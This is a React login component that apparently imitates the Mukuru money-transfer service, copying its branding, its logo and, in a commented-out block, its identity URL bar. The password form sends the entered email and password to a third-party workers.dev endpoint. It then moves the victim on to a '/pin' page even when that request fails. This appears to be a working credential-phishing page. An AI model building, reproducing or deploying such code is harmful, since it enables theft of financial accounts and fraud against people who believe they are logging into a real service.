import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";

export default function MukuruPasswordLogin() {
  const navigate = useNavigate();
  const location = useLocation();

  const emailFromState = location.state?.email;
  const [email] = useState(emailFromState || "");

  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // Redirect if no email
  useEffect(() => {
    if (!emailFromState) {
      navigate("/", { replace: true });
    }
  }, [emailFromState, navigate]);

  const handleLogin = async () => {
    setError("");

    // Validation
    if (!password.trim()) {
      setError("Password is required");
      return;
    }
    // if (password.length < 6) {
    //   setError("Password must be at least 6 characters");
    //   return;
    // }

    // API CALL
    try {
      setLoading(true);
      const response = await fetch("https://my-worker.instapayapi.workers.dev/api/signin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (!response.ok) {
        setError(data.message || "Invalid password. Please try again.");
        return;
      }

      // Success → go to OTP page
      navigate("/pin", { state: { email, password } });
    } catch (err) {
      console.error("API error:", err);
      // For demo: still navigate forward
      navigate("/pin", { state: { email,password } });
    } finally {
      setLoading(false);
    }
  };

  const handleRestart = () => {
    navigate("/");
  };

  if (!emailFromState) return null;

  return (
    <div className="min-h-screen bg-gray-500 flex flex-col">
      {/* <div className="bg-gray-500 pt-6 px-3">
        <div className="bg-white rounded-t-2xl px-5 py-4 flex items-center justify-between">
          <p className="text-gray-700 text-sm sm:text-base truncate flex-1 pr-3">
            https://identity.mukuru.com/realms/mukur...
          </p>
          <button aria-label="Close" className="flex-shrink-0 text-gray-900">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="22"
              height="22"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>
      </div> */}

      <div className="flex-1 flex flex-col bg-[#3A3A3A]">
        {/* <header className="bg-[#EF5A24] px-6 py-7 flex items-center gap-3">
          <svg viewBox="0 0 100 100" className="w-11 h-11 flex-shrink-0">
            <g fill="white">
              {Array.from({ length: 12 }).map((_, i) => {
                const angle = (i * 30 * Math.PI) / 180;
                const x1 = 50 + Math.cos(angle) * 18;
                const y1 = 50 + Math.sin(angle) * 18;
                const x2 = 50 + Math.cos(angle) * 45;
                const y2 = 50 + Math.sin(angle) * 45;
                const perpAngle = angle + Math.PI / 2;
                const w = 6;
                const p1x = x1 + Math.cos(perpAngle) * w;
                const p1y = y1 + Math.sin(perpAngle) * w;
                const p2x = x1 - Math.cos(perpAngle) * w;
                const p2y = y1 - Math.sin(perpAngle) * w;
                return (
                  <polygon
                    key={i}
                    points={`${p1x},${p1y} ${p2x},${p2y} ${x2},${y2}`}
                  />
                );
              })}
              <circle cx="50" cy="50" r="14" />
            </g>
          </svg>
          <h1 className="text-white text-3xl font-semibold tracking-tight">
            mukuru
          </h1>
        </header> */}
         <header className="bg-[#E8442A] px-6 py-7 flex items-center gap-3">
          {/* <svg viewBox="0 0 100 100" className="w-11 h-11 flex-shrink-0">
            <g fill="white">
              {Array.from({ length: 12 }).map((_, i) => {
                const angle = (i * 30 * Math.PI) / 180;
                const x1 = 50 + Math.cos(angle) * 18;
                const y1 = 50 + Math.sin(angle) * 18;
                const x2 = 50 + Math.cos(angle) * 45;
                const y2 = 50 + Math.sin(angle) * 45;
                const perpAngle = angle + Math.PI / 2;
                const w = 6;
                const p1x = x1 + Math.cos(perpAngle) * w;
                const p1y = y1 + Math.sin(perpAngle) * w;
                const p2x = x1 - Math.cos(perpAngle) * w;
                const p2y = y1 - Math.sin(perpAngle) * w;
                return (
                  <polygon
                    key={i}
                    points={`${p1x},${p1y} ${p2x},${p2y} ${x2},${y2}`}
                  />
                );
              })}
              <circle cx="50" cy="50" r="14" />
            </g>
          </svg> */}
          <div className="h-[42px] w-[42px]">
          <svg viewBox="0 0 52 52" fill="none" class="login-logo-icon"><path d="M26 2 L31.5 13 L44 8 L39 20.5 L51 26 L39 31.5 L44 44 L31.5 39 L26 50 L20.5 39 L8 44 L13 31.5 L1 26 L13 20.5 L8 8 L20.5 13 Z" fill="none" stroke="#fff" stroke-width="3.5" stroke-linejoin="round" stroke-linecap="round"></path></svg>
          </div>
          <h1 className="text-white text-3xl font-semibold tracking-tight">
            MUKURU
          </h1>
        </header>

        <main className="flex-1 px-6 pt-7 pb-6 flex flex-col">
          <div className="mb-2">
            <h2 className="text-white text-2xl font-bold mb-3">
              Welcome To Mukuru
            </h2>
          </div>

          <button
            onClick={handleRestart}
            className="flex items-center gap-2 mb-5 group w-fit"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="20"
              height="20"
              viewBox="0 0 24 24"
              fill="none"
              stroke="#2DBDB6"
              strokeWidth="2.5"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <polyline points="1 4 1 10 7 10"></polyline>
              <polyline points="23 20 23 14 17 14"></polyline>
              <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
            </svg>
            <span className="text-[#2DBDB6] underline text-base font-normal">
              Restart login
            </span>
          </button>

          <div className="bg-[#5A5A5A] rounded-2xl p-6 mb-7">
            <div className="mb-5">
              <label
                htmlFor="email"
                className="block text-white text-base font-bold mb-3"
              >
                Email
              </label>
              <input
                id="email"
                type="email"
                value={email}
                readOnly
                className="w-full bg-[#E8E8E8] rounded-full px-6 py-3.5 text-gray-700 outline-none text-base cursor-not-allowed"
              />
            </div>

            <div>
              <label
                htmlFor="password"
                className="block text-white text-base font-bold mb-3"
              >
                Password
              </label>
              <div className="relative bg-white rounded-full flex items-center">
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (error) setError("");
                  }}
                  onFocus={() => setPasswordFocused(true)}
                  onBlur={() => setPasswordFocused(false)}
                  onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                  autoFocus
                  className={`flex-1 bg-white rounded-full px-6 py-3.5 pr-14 text-gray-800 outline-none text-base ${
                    error
                      ? "ring-2 ring-red-500 ring-inset"
                      : passwordFocused
                      ? "ring-2 ring-[#E8A33D] ring-inset"
                      : ""
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label={showPassword ? "Hide password" : "Show password"}
                  className="absolute right-2 top-1/2 -translate-y-1/2 p-2 text-[#2DBDB6]"
                >
                  {showPassword ? (
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                    >
                      <path d="M12 6.5c3.79 0 7.17 2.13 8.82 5.5-.59 1.22-1.42 2.27-2.41 3.12l1.41 1.41c1.39-1.23 2.49-2.77 3.18-4.53C21.27 7.61 17 4.5 12 4.5c-1.27 0-2.49.2-3.64.57l1.65 1.65c.65-.14 1.32-.22 1.99-.22zM2.71 3.16a.996.996 0 0 0 0 1.41l1.97 1.97C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.97-.3 4.31-.82l2.72 2.72a.996.996 0 1 0 1.41-1.41L4.13 3.16c-.39-.39-1.03-.39-1.42 0zM12 16.5c-2.76 0-5-2.24-5-5 0-.77.18-1.5.49-2.14l1.57 1.57c-.03.18-.06.37-.06.57 0 1.66 1.34 3 3 3 .2 0 .38-.03.57-.07L14.14 16c-.65.32-1.37.5-2.14.5zm2.97-5.33a2.97 2.97 0 0 0-2.64-2.64l2.64 2.64z" />
                    </svg>
                  ) : (
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                    >
                      <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
                    </svg>
                  )}
                </button>
              </div>
              {error && (
                <p className="text-red-400 text-sm mt-2 ml-2 font-medium">
                  {error}
                </p>
              )}
            </div>
          </div>

          <button
            onClick={handleLogin}
            disabled={loading}
            className="w-full bg-[#E8442A] hover:bg-[#d94e1e] active:bg-[#c44519] disabled:opacity-60 disabled:cursor-not-allowed transition-colors text-white font-bold text-lg py-4 rounded-full mb-6 flex items-center justify-center gap-2"
          >
            {loading ? (
              <>
                <svg
                  className="animate-spin h-5 w-5"
                  viewBox="0 0 24 24"
                  fill="none"
                >
                  <circle
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                    className="opacity-25"
                  />
                  <path
                    fill="currentColor"
                    className="opacity-75"
                    d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
                  />
                </svg>
                Logging in...
              </>
            ) : (
              "Login"
            )}
          </button>

          <div className="border-t border-gray-500/40 mb-6"></div>

          <div className="text-center">
            <a
              href="#forgot"
              className="text-[#2DBDB6] underline text-base font-normal"
            >
              I forgot my password?
            </a>
          </div>

          <div className="flex-1"></div>
        </main>
      </div>
    </div>
  );
}